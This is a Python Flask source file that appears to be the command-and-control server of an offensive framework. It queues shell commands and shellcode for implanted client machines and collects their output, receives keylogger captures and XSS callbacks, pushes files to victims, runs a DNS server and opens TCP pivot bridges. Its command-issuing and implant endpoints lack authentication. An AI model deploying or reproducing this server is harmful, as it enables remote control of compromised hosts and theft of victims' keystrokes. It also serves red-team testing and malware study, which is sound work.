import re
import os
import sys
import json
import yaml
import socket
import logging
import threading
from functools import wraps
from lazyown import LazyOwnShell
from dnslib.dns import RR, QTYPE, TXT
from dnslib.server import DNSServer, DNSLogger
from flask import Flask, request, render_template, redirect, url_for, jsonify, Response, send_from_directory


BASE_DIR = os.path.abspath("../sessions")  
shell = LazyOwnShell()
shell.onecmd('p')
shell.onecmd('create_session_json')
if len(sys.argv) > 3:
    lport = sys.argv[1]
    USERNAME = sys.argv[2]
    PASSWORD = sys.argv[3]
    print(f"    [!] Launch C2 at: {lport}")
else:
    print("    [!] Need pass the port, user & pass as argument")
    sys.exit(2)

app = Flask(__name__, static_folder='static')
commands = {} 
results = {}
commands_history = {} 
connected_clients = set() 
path = os.getcwd()
atomic_framework_path = f'{path}/external/.exploit/atomic-red-team/atomics'
if not os.path.exists(atomic_framework_path):
    shell.onecmd('atomic_tests')
    
def check_auth(username, password):
    """Verifica si el usuario y contraseña son correctos"""
    return username == USERNAME and password == PASSWORD

def authenticate():
    """Solitica autenticación"""
    return Response(
        'Invalid credentials. Please provide valid username and password.\n', 
        401, 
        {'WWW-Authenticate': 'Basic realm="Login Required"'}
    )

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

def start_dns_server():
    """
    Inicia un servidor DNS que responde con un registro TXT específico.
    """
    class CustomDNSResolver:
        def resolve(self, request, handler):
            reply = request.reply()
            qname = request.q.qname
            if str(qname) == "info.lazyown.com.":
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("http://lazyown.com/info")))
            else:
                reply.header.rcode = 3  
            return reply

    resolver = CustomDNSResolver()
    logger = DNSLogger(prefix=False)
    server = DNSServer(resolver, port=53, address="0.0.0.0", logger=logger)
    print("    [*] Server DNS started at port 53.")
    server.start()

@app.route('/')
@requires_auth
def index():
    path = os.getcwd()
    sessions_dir = f'{path}/sessions'
    json_files = [f for f in os.listdir(sessions_dir) if f.endswith('.json')]
    if not json_files:
        return "No JSON files found in the sessions directory.", 404

    latest_json_file = max(json_files, key=lambda x: os.path.getctime(os.path.join(sessions_dir, x)))
    json_path = os.path.join(sessions_dir, latest_json_file)

    with open(json_path, 'r') as f:
        session_data = json.load(f)

    connected_clients_list = list(connected_clients)
    directories = [d for d in os.listdir(atomic_framework_path) if os.path.isdir(os.path.join(atomic_framework_path, d))]
    return render_template('index.html', connected_clients=connected_clients_list, results=results, session_data=session_data, commands_history=commands_history, username=USERNAME, password=PASSWORD, directories=directories)

@app.route('/xss', methods=['GET'])
def xss():
    params = request.args
    if params:
        path = os.getcwd
        log_dir = f"{path}/../sessions"
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
        log_file = os.path.join(log_dir, "xss.log")
        logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')
        logging.info(f"XSS Exec with params: {params}")
        return "XSS report", 200

    return "No data received", 400

@app.route('/command/<client_id>', methods=['GET'])
def send_command(client_id):
    connected_clients.add(client_id) 
    if client_id in commands:
        command = commands.pop(client_id)
        print(f"[INFO] Sending command to {client_id}: {command}")

        return command, 200 
    return '', 204

@app.route('/command/<client_id>', methods=['POST'])
def receive_result(client_id):
    try:
        data = request.json
        if data and 'output' in data:
            output = data['output']
            client = data['client']
            command = data.get('command')

            results[client_id] = {
                "output": output,
                "client": client
            }
            if command:
                results[client_id]["command"] = command
            if output != "":
                print(f"[INFO] Received output from {client_id}: {output} Plataform: {client}")
                return jsonify({"status": "success", "Plataform": client}), 200
            else:
                return jsonify({"status": "empty", "Plataform": client}), 200
        else:
            print(f"[ERROR] Invalid data received from {client_id}")
            return jsonify({"status": "error", "message": "Invalid data format"}), 400
    except json.JSONDecodeError:
        print(f"[ERROR] Invalid JSON received from {client_id}")
        return jsonify({"status": "error", "message": "Invalid JSON"}), 400
    except Exception as e:
        print(f"[ERROR] Unexpected error processing request from {client_id}: {str(e)}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500

@app.route('/issue_command', methods=['POST'])
def issue_command():
    client_id = request.form['client_id']
    command = request.form['command']

    commands[client_id] = command
    if client_id not in commands_history:
        commands_history[client_id] = []
    commands_history[client_id].append(command)

    return redirect(url_for('index'))

@app.route('/upload', methods=['GET', 'POST'])
@requires_auth
def upload():
    """
    Handle file uploads securely.

    This function allows users to upload files and ensures that the uploaded filename is sanitized
    to prevent directory traversal and other vulnerabilities. Files are saved in a specified uploads directory.

    Returns:
        JSON response indicating the status of the upload or an HTML form for file upload.
    """
    if request.method == 'POST':
        if 'file' not in request.files:
            return jsonify({"status": "error", "message": "No file part"}), 400
        
        file = request.files['file']

        if file.filename == '':
            return jsonify({"status": "error", "message": "No selected file"}), 400
        safe_filename = secure_filename(file.filename)
        path = os.getcwd()

        uploads_dir = os.path.join(path+"/sessions", 'uploads')
        os.makedirs(uploads_dir, exist_ok=True)
        filepath = os.path.join(uploads_dir, safe_filename)
        file.save(filepath)  
        print(f"[INFO] File uploaded: {safe_filename}")
        
        return jsonify({"status": "success", "message": f"File uploaded: {safe_filename}"}), 200
    
    return '''
    <!doctype html>
    <title>Upload File</title>
    <h1>Upload a File</h1>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>
    '''
@app.route('/keylogger/<client_id>', methods=['POST'])
def keylogger(client_id):
    """
    Recibe los logs del keylogger desde el cliente.

    :param client_id: Identificador del cliente que envía los logs.
    :return: Respuesta de éxito o error.
    """
    try:
        log_data = request.form.get('log')
        if log_data:
            path = os.getcwd().replace("modules", "sessions")
            keylog_dir = os.path.join(path, 'keylogs')
            os.makedirs(keylog_dir, exist_ok=True)
            log_file = os.path.join(keylog_dir, f'keylog_{client_id}.txt')
            with open(log_file, 'a') as f:
                f.write(log_data + '\n')
            print(f"[INFO] Keylog recibido de {client_id}.")
            return jsonify({"status": "success", "message": "Logs received"}), 200
        else:
            print(f"[ERROR] No se recibieron logs desde {client_id}.")
            return jsonify({"status": "error", "message": "No logs received"}), 400

    except Exception as e:
        print(f"[ERROR] Error procesando logs de {client_id}: {str(e)}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500

@app.route('/view_yaml', methods=['POST'])
@requires_auth
def view_yaml():
    selected_directory = request.form.get('directory')
    if not selected_directory:
        return redirect(url_for('index'))

    yaml_data = []

    selected_path = os.path.join(atomic_framework_path, selected_directory)

    for root, dirs, files in os.walk(selected_path):
        for file in files:
            if file.endswith('.yaml'):
                yaml_file_path = os.path.join(root, file)
                with open(yaml_file_path, 'r') as file:
                    data = yaml.safe_load(file)
                    for test in data.get('atomic_tests', []):
                        yaml_data.append({
                            'auto_generated_guid': test.get('auto_generated_guid'),
                            'name': test.get('name'),
                            'description': test.get('description'),
                            'supported_platforms': test.get('supported_platforms')
                        })

    return render_template('yaml_view.html', yaml_data=yaml_data, directory=selected_directory)

@app.route('/download_file', methods=['POST'])
def download_file():
    client_id = request.form['client_id']
    file = request.files['file']
    if file:
        temp_dir = os.path.join(os.getcwd(), 'sessions/temp_uploads')
        os.makedirs(temp_dir, exist_ok=True)
        file_path = os.path.join(temp_dir, file.filename)
        file.save(file_path)
        commands[client_id] = f"download:{file.filename}"

        return redirect(url_for('index'))
    else:
        return jsonify({"status": "error", "message": "No file selected"}), 400

@app.route('/download/<path:file_path>', methods=['GET'])
def serve_file(file_path):
    temp_dir = os.path.join(os.getcwd(), 'sessions/temp_uploads')
    full_file_path = os.path.join(temp_dir, file_path)
    if os.path.exists(full_file_path):
        try:
            file_name = os.path.basename(file_path)
            return send_from_directory(temp_dir, file_name, as_attachment=True)
        except Exception as e:
            return str(e), 500
    else:
        return jsonify({"status": "error", "message": "File not found"}), 404

@app.route('/api/run', methods=['POST'])
@requires_auth
def run_command():
    data = request.json
    command = data.get('command')

    if not command:
        return jsonify({"error": "No command provided"}), 400

    output = shell.one_cmd(command)
    print(f"[INFO]{output}")

    
    print(f"[INFO] Type of output: {type(output)}")

    
    if isinstance(output, str):
        serializable_output = output
    elif isinstance(output, (int, float, bool, type(None))):
        serializable_output = str(output)
    elif isinstance(output, (list, dict)):
        serializable_output = output
    else:
        
        try:
            serializable_output = vars(output)
        except TypeError:
            serializable_output = str(output)

    return jsonify({"result": serializable_output}), 200
 


@app.route('/api/output', methods=['GET'])
def get_output():
    global shell
    output = shell.output  

    
    print(f"[INFO] Type of output: {type(output)}")

    
    if isinstance(output, str):
        serializable_output = output
    elif isinstance(output, (int, float, bool, type(None))):
        serializable_output = str(output)
    elif isinstance(output, (list, dict)):
        serializable_output = output
    else:
        
        try:
            serializable_output = vars(output)
        except TypeError:
            serializable_output = str(output)

    return jsonify({"output": serializable_output}) 

@app.route('/run_shellcode', methods=['POST'])
@requires_auth
def run_shellcode():
    client_id = request.form['client_id']
    shellcode = request.form['shellcode']
    commands[client_id] = f"sc:{shellcode}"
    return redirect(url_for('index'))

@app.route('/get_results', methods=['GET'])
@requires_auth
def get_results():
    return jsonify(results)

@app.route('/start_bridge', methods=['POST'])
@requires_auth
def start_bridge():
    """Start a TCP bridge to a specified remote host and port."""
    local_port = int(request.form['local_port'])
    remote_host = request.form['remote_host']
    remote_port = int(request.form['remote_port'])
    bridge_thread = threading.Thread(target=tcp_bridge, args=(local_port, remote_host, remote_port))
    bridge_thread.start()
    
    return jsonify({"status": "success", "message": f"TCP bridge started on port {local_port} to {remote_host}:{remote_port}"}), 200

def tcp_bridge(local_port, remote_host, remote_port):
    """Establish a TCP bridge between a local port and a remote host."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', local_port))
    server_socket.listen(5)
    print(f"[*] Listening for connections on port {local_port}...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"[INFO] Accepted connection from {addr}")
        
        threading.Thread(target=handle_client, args=(client_socket, remote_host, remote_port)).start()

def handle_client(client_socket, remote_host, remote_port):
    """Handle communication between the client and the remote server."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.connect((remote_host, remote_port))
        
        while True:
            
            client_data = client_socket.recv(4096)
            if not client_data:
                break
            server_socket.sendall(client_data)

            
            server_data = server_socket.recv(4096)
            if not server_data:
                break
            client_socket.sendall(server_data)

    client_socket.close()        
def secure_filename(filename):
    """
    Sanitize the filename to prevent directory traversal and unauthorized access.

    :param filename: The original filename from the upload.
    :return: A sanitized filename that is safe for storage.
    """
    filename = re.sub(r'[^a-zA-Z0-9_.-]', '_', filename)
    return filename[:255]

if __name__ == '__main__':
    path = os.getcwd().replace("modules", "sessions" )
    uploads = f"{path}/uploads"
    dns_thread = threading.Thread(target=start_dns_server, daemon=True)
    dns_thread.start()
    if not os.path.exists(uploads):
        os.makedirs(uploads)  
    app.run(host='0.0.0.0', port=lport)
